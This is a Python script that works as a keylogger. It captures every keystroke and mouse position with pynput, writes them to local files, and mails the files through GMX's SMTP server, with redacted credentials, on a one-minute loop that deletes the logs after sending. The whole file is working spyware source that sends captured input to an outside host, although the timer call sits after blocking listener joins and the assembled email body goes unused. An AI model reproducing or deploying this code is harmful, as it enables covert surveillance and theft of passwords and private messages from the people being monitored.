from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import smtplib
from email.message import EmailMessage
import os
import datetime
import time

# Files for saving keyboard and mouse data
keyboard_log_file = "keyboard.txt"
mouse_log_file = "mouse.txt"

# Buffer to store keyboard input
buffer = ""

# Function to save the keyboard buffer to a file
def save_to_file(text, log_file):
    with open(log_file, 'a') as f:
        f.write(text)

# Function to handle key presses (keyboard input)
def on_key_press(key):
    global buffer
    try:
        if key.char:  # If it's a normal character
            buffer += key.char
    except AttributeError:
        if key == Key.space:  # Space indicates the end of a word
            buffer += " "
            save_to_file(buffer, keyboard_log_file)
            buffer = ""  # Reset the buffer
        elif key == Key.enter:  # Enter key indicates the end of a line
            buffer += "\n"
            save_to_file(buffer, keyboard_log_file)
            buffer = ""  # Reset the buffer
        elif key == Key.backspace:  # Handle backspace
            buffer = buffer[:-1]  # Remove last character in the buffer

# Function to handle mouse movement and log positions
def mouse_position(x, y):
    with open(mouse_log_file, "a") as f:
        f.write(f"Current pointer position is: ({x}, {y})\n")

# Function to send email with logs attached
def send_email():
    e = datetime.datetime.now()

    # GMX email login credentials
    gmx_user = '*****'
    gmx_password = '****'

    # Create email message
    message = EmailMessage()
    message['Subject'] = 'Keyboard and Mouse Activity Logs'
    message['From'] = gmx_user
    message['To'] = '****'  # Replace with your recipient email

    # Attach the log files
    files = [keyboard_log_file, mouse_log_file]
    for file in files:
        if os.path.exists(file):  # Check if file exists before attaching
            with open(file, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(f.name)
                message.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    try:
        # Connect to GMX SMTP server
        smtp_server = smtplib.SMTP('smtp.gmx.com', 587)  # GMX uses port 587 for TLS
        smtp_server.starttls()  # Start TLS encryption
        smtp_server.login(gmx_user, gmx_password)

        # Send email
        smtp_server.send_message(message)
        smtp_server.quit()

        # Print success message with current time
        print(f"Email sent at: {e.hour}:{e.minute}:{e.second}")

    except Exception as ex:
        print("Problem in sending email:", ex)

# Schedule email sending every 1 minute
def timer():
    while True:
        time.sleep(60)  # Sleep for 1 minute
        try:
            f = open(keyboard_log_file, "r")
            keyboard = f.read()
            f1 = open(mouse_log_file, "r")
            mouse = f1.read()
            
            # Combine keyboard and mouse logs into a body for the email
            body = "Keyboard and Mouse Activity Logs:\n\n"
            body += f"Keyboard Logs:\n{keyboard}\n\n"
            body += f"Mouse Logs:\n{mouse}"
            
            # Send the email with logs attached
            send_email()
            
            # Clean up (optional): Delete the log files after sending
            os.remove(keyboard_log_file)
            os.remove(mouse_log_file)
        except Exception as ex:
            print("Error reading files or sending email:", ex)

# Start listeners
with Listener(on_press=on_key_press) as keyboard_listener:
    with MouseListener(on_move=mouse_position) as mouse_listener:
        # Run listeners indefinitely
        keyboard_listener.join()  # Keep listening for keyboard events
        mouse_listener.join()  # Keep listening for mouse events
        timer()  # Run the timer in the background to send emails
